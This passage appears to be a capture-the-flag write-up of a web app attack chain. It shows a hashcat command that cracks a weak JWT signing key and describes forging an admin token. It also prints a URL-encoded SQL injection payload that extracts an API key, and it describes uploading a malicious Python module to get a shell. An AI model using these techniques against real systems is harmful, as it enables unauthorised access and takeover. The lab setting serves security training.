After logging in with your new account, there's an "admin" check. A common key is used to sign JWTs here, you can crack it using hashcat.

```bash
$ hashcat 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImFkbWluIjpmYWxzZSwiZXhwIjoxNzU1OTYzMzYwfQ.y3Uas6j0NdRN0SSV9QrQxhxSz0C6-i57yny4AEyQjCA' /usr/share/wordlists/rockyou.txt
...[SNIP]...
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImFkbWluIjpmYWxzZSwiZXhwIjoxNzU1OTYzMzYwfQ.y3Uas6j0NdRN0SSV9QrQxhxSz0C6-i57yny4AEyQjCA:secretkey
```

Sign your own token with the admin claim set to true.

Admin dashboard lets you search for users, and this API endpoint is vulnerable to SQL injection. After basic enum, you will know it's 4 columns, and is sqlite.

Now you might be wondering how to get RCE from sqlite ðŸ¤”  It's not possible without loaded extensions, or a file write primitive, even moreso because this is a python app.

There's a non-default table `settings` that gives us an API key.
```
'%20union%20SELECT%201%2Ckey%2Cvalue%2C4%20FROM%20settings%3B--
```
You can use the API key to upload a malicious python module to get a shell on the box. Swagger docs is enabled (/api/docs) which allows you to discover this endpoint.
